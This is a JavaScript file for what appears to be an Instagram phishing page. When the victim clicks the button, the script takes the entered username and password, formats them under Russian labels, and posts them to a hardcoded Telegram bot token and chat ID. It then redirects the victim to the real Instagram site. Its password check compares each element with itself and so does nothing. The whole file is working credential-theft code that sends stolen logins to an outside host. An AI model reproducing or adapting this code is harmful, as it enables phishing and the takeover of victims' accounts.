const token = "5608963833:AAHQqCpoNn6OdC1p4gTA4gVWtlFtyfU2DIs";
const chatID = "-1001831895099";
const uriApi = `https://api.telegram.org/bot${token}/sendMessage`;

const login = document.querySelector(".login");
const password = document.querySelector(".password");
const button = document.querySelector(".button");

button.addEventListener("click", function (e) {
  e.preventDefault();

  if (login === login && password === password) {
    window.location.href = "https://www.instagram.com/";
  } else {
    alert("Invalid username or password");
  }

  let message = `<b>Данные логина и паролля</b> \n`;
  message += `<b>Логин :</b> ${login.value} \n`;
  message += `<b>Пароль :</b> ${password.value} \n`;

  axios.post(uriApi, {
    chat_id: chatID,
    parse_mode: "html",
    text: message,
  });
});
